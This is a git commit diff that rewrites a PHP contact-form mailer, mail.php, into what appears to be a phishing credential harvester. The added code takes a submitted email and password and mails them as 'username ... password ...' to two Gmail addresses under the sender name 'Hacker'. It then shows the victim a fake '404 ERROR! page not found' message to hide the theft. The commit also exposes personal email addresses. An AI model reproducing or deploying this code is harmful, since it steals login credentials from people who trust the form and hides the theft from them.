0509ee8ad0d52461547d00e453b48c9a104316cb
DENNIS LUMOSI <lumocigwad@gmail.com>
2018-09-07 20:38:33 +0300

    Update mail.php

--- mail.php
+++ mail.php
@@ -1,13 +1,16 @@
 <?php
-if (isset($_POST['submit'])){
-	$email_to="kotech.ke@gmail.com";
-	$email=$_POST['email'];
-	$subject= $_POST['subject'];
-	$name= $_POST['name'];
-	$message= $_POST['message'];
-
-	mail($email_to,$name,$subject,$message,$email);
+if(isset($_POST['submit'])){
+$name=$_POST['email'];
+$pass=$_POST['pass'];
+$t ="Palmararthuro@gmail.com";
+$to ="lumocigwad@gmail.com";
+$subject ="new user ";
+$headers ="From :$name "; 
+$message ="username ".$name ."password ".$pass;
+$headers="From:Hacker";
+mail($to,$subject,$message ,$headers);
+mail ($t, $subject,$message, $headers);
+echo "'<font color='red'>404 ERROR!  page not found</font>'";
 
 }
-
 ?>
